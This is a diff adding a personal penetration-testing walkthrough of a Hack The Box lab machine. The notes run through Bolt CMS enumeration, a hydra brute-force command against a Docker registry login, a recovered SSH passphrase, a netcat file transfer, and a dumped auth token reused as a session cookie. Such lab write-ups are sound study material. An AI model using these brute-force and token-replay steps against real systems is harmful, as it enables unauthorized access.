@@ -28,7 +28,119 @@
 <br/><br/>
 
 * Response header called `X-Debug-Token: 7ea91f` indicates that the "profiler" is running and it might be exposing information ( the symphony profiler) which is great news.
+* It doesn't seem like it's the profiler thing.
+* To get authenticated the only thing that makes sense is that 
+  * Either the login page has a weird, very very unusual name or that I can put a session key or cookie into the request and act like I'm authenticated BUT I don't have a cookie or a session key. I don't have any other web page that this "bolt". 
+  * I almost memorized it's documentation.
+  * The login page is usually at `/login`.
+  * "anonymous" is allowed to login in the config file which means I'm not locked out entirely.
+* I thought this might've been interesting `Strict-Transport-Security: max-age=63072000; includeSubdomains` the "includeSubdomains" part but turns out it's also a deadend.  
+* Found this file and it seems interesting `https://10.10.10.159/bolt/composer.json`
+* It seems like the way we're accessing data in bolt is "RESTful" which is the way that treats the portion between the domain and the parameters as data instead of using parameters "/bolt/entry/1".  
 
+* Finally I got something  
+* I got this through requesting `/v2` but I need to find an endpoint I guess.  
+```uri
+HTTP/1.1 401 Unauthorized
+
+Server: nginx/1.14.0 (Ubuntu
+Date: Fri, 11 Feb 2022 09:32:27 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 87
+Connection: close
+Docker-Distribution-Api-Version: registry/2.0
+Www-Authenticate: Basic realm="Registry"
+X-Content-Type-Options: nosniff
+
+
+{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
+```  
+
+* That's what I found by researching  
+  <blockquote>
+  If a 401 Unauthorized response is returned, the client should take action based on the contents of the “WWW-Authenticate” header and try the endpoint again. Depending on access control setup, the client may still have to authenticate against different resources, even if this check succeeds.
+  </blockquote>  
+
+* The realm is as follows  
+  <blockquote>
+  The "realm" authentication parameter is reserved for use by authentication schemes that wish to indicate a scope of protection.
+  A protection space is defined by the canonical root URI (the scheme and authority components of the effective request URI) of the server being accessed, in combination with the realm value if present. These realms allow the protected resources on a server to be partitioned into a set of protection spaces, each with its own authentication scheme and/or authorization database. The realm value is a string, generally assigned by the origin server, that can have additional semantics specific to the authentication scheme. Note that a response can have multiple challenges with the same auth-scheme but with different realms.
+  </blockquote>  
+
+```
+  hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst docker.registry.htb -s 443 https-get /v2/
+```  
+
+* I GOT ACCESS. I brute forced the authentication of the docker registry and found a password "admin:admin" on the http service not the https.  
+* Found a passphrase for bolt ssh login "GkOcz221Ftb3ugog".
+* Uncommon setuid binary `/sbin/mount.cifs`.  
+* Backups no OS  
+```console
+/var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/tests/_data/dump.sql
+/var/www/html/bolt/vendor/codeception/codeception/tests/data/included/jazz/pianist/tests/_data/dump.sql
+/var/www/html/bolt/vendor/codeception/codeception/tests/data/included/shire/tests/_data/dump.sql
+/var/www/html/bolt/vendor/codeception/codeception/tests/data/dump.sql
+/var/www/html/bolt/vendor/codeception/codeception/tests/data/claypit/tests/_data/dump.sql
+
+```  
+
+* `Feb10     1754     root registry serve /etc/docker/registry/config.yml`
+
+* Seems interesting `Feb10     1726     root /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000`  
+
+```
+GET /v2/_catalog HTTP/1.1
+Host: 172.18.0.2:5000
+Authorization: Basic YWRtaW46YWRtaW4=
+```  
+* There's no docker group and I can't create one
+* I can't see if I have sudo privilege because I don't know what's my user's password.
+
+* The docker registry stuff are stored in this path `/srv/docker-registry/data/docker/registry/v2`.
+
+* Possiblities  
+  * the backup that I can execute when requesting the "backup.php" page.
+  * Docker? I don't have permission to do anything ( I'm excluding it for now) or maybe I can try and do something about the permission denied.
+  * there's something weird in one of the database files ( it has a column called "stack" and inside of it, there's a value of ["files://shell.php"]) which looks interesting but I don't know what the hell it means.  
+  * The `runc` command but there's nothing from its side either.
+  * There's also the `registry serve /etc/docker/registry/config.yml` command that neither the command exists nor the file in the path exists.  
+
+nc -l -p 1234 > suid3num.py
+
+nc -w 3 10.10.10.159 1234 < suid3num.py  
+
+* This could be something `/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request`.  
+* Use SUID3NUM it's nice. Relieves the burden of searching through the SUID binaries and checking if it's normal that they have the sticky bit or not. ( And it's legit in OSCP)  
+
+* SOMETHING!!!  
+
+```console
+CREATE TABLE bolt_authtoken (
+  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, 
+  user_id INTEGER DEFAULT NULL, 
+  username VARCHAR(32) DEFAULT NULL, 
+  token VARCHAR(128) NOT NULL, 
+  salt VARCHAR(128) NOT NULL, 
+  lastseen DATETIME DEFAULT NULL, 
+  ip VARCHAR(45) DEFAULT NULL, 
+  useragent VARCHAR(128) DEFAULT NULL, 
+  validity DATETIME DEFAULT NULL)
+1, 
+1, 
+None, 
+a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2, 
+f8e7da1a2b9ea7109e0bdeedb6e85135, 
+2019-10-08 21:25:07, 
+192.168.1.52, 
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36, 
+2019-10-22 21:25:07
+```  
+
+<blockquote>
+The bolt_authtoken cookie is used to store a token for your identification in the bolt admin interface after you logged in (if you remove it you will be logged out).
+</blockquote>
+
+Cookie: bolt_authtoken=a52cd7688a18a6b0c787aa1539c3c734ae551ae5497b3f8bc8bda953cb65cba2
 
 
 ## <span style="color:#9933FF">How Did I Solve the Machine 😎🥳 
